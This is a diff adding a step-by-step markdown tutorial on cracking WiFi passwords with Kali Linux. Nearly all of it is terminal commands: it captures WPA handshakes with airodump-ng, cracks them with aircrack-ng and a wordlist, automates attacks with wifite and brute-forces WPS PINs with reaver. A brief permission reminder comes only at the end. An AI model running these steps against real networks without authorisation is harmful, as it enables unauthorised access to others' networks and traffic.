@@ -1,0 +1,110 @@
+This guide will walk you through the process of setting up and performing WiFi hacking using Kali Linux. We'll cover the installation of necessary tools, capturing packets, and cracking WiFi passwords.
+
+## Prerequisites
+
+- A computer running Kali Linux.
+- A wireless network adapter that supports monitor mode and packet injection.
+- Basic knowledge of Linux command line.
+
+
+
+## Step 1: Update Your System
+
+Open a terminal and update your system to ensure you have the latest packages and security updates.
+
+```bash
+ sudo apt update && sudo apt upgrade -y
+```
+
+## Step 2: Install Necessary Tools
+
+Kali Linux comes with many pre-installed tools, but you might need to install additional ones. For WiFi hacking, you will primarily use `aircrack-ng`, `wifite`, and `reaver`.
+
+```bash
+sudo apt install aircrack-ng wifite reaver -y
+```
+
+## Step 3: Enable Monitor Mode
+
+Monitor mode allows your wireless adapter to capture all packets within range. Replace `wlan0` with your wireless interface name.
+
+```bash
+sudo airmon-ng start wlan0
+```
+
+This command will create a new interface, typically `wlan0mon`, which is in monitor mode.
+
+## Step 4: Scan for Available Networks
+
+Use `airodump-ng` to scan for available WiFi networks. Replace `wlan0mon` with your monitor mode interface.
+
+```bash
+sudo airodump-ng wlan0mon
+```
+
+This will display a list of available networks, including their BSSID, channel, encryption type, and signal strength.
+
+## Step 5: Select a Target Network
+
+Choose a network from the list and note its BSSID and channel. For example, let's target a network with BSSID `00:11:22:33:44:55` on channel 6.
+
+## Step 6: Capture a WPA Handshake
+
+Focus on the target network and capture a WPA handshake. Replace `00:11:22:33:44:55` with the target BSSID and `wlan0mon` with your monitor mode interface.
+
+```bash
+sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 --write capture wlan0mon
+```
+
+This command will capture packets and save them to a file named `capture-01.cap`. Wait for a client to connect to the network to capture the handshake.
+
+## Step 7: Crack the WPA Password
+
+Once you have captured a handshake, you can use `aircrack-ng` to crack the password. Replace `capture-01.cap` with your capture file name.
+
+```bash
+sudo aircrack-ng -w /path/to/wordlist.txt capture-01.cap
+```
+
+This command will attempt to crack the WPA password using a wordlist. You can find wordlists online or create your own.
+
+## Step 8: Automate the Process with Wifite
+
+Wifite automates the process of WiFi hacking, making it easier for beginners. Start Wifite and follow the on-screen instructions.
+
+```bash
+sudo wifite
+```
+
+Wifite will scan for networks, select a target, and attempt to crack the password automatically.
+
+## Step 9: Brute-Force WPS PIN with Reaver
+
+Reaver can be used to brute-force the WPS PIN of a router. Replace `00:11:22:33:44:55` with the target BSSID.
+
+```bash
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -v
+```
+
+Reaver will attempt to recover the WPA/WPA2 passphrase by brute-forcing the WPS PIN.
+
+## Step 10: Analyze Captured Packets with netsniff-ng
+
+netsniff-ng can be used to analyze captured network packets. Start netsniff-ng and specify your monitor mode interface.
+
+```bash
+sudo netsniff-ng wlan0mon
+```
+
+This tool provides a detailed view of the network traffic, which can be useful for further analysis.
+
+
+
+## Conclusion
+
+By following these steps, you should be able to perform basic WiFi hacking techniques using Kali Linux. Remember to always have permission to test networks and respect privacy and security guidelines.
+
+For more advanced techniques and tools, refer to the detailed guides in the `tools` directory of this repository.
+```
+
+This guide provides a comprehensive, step-by-step process for performing WiFi hacking in Kali Linux, from setting up your environment to capturing and cracking WiFi passwords. You can customize and expand on this guide as needed for your repository.
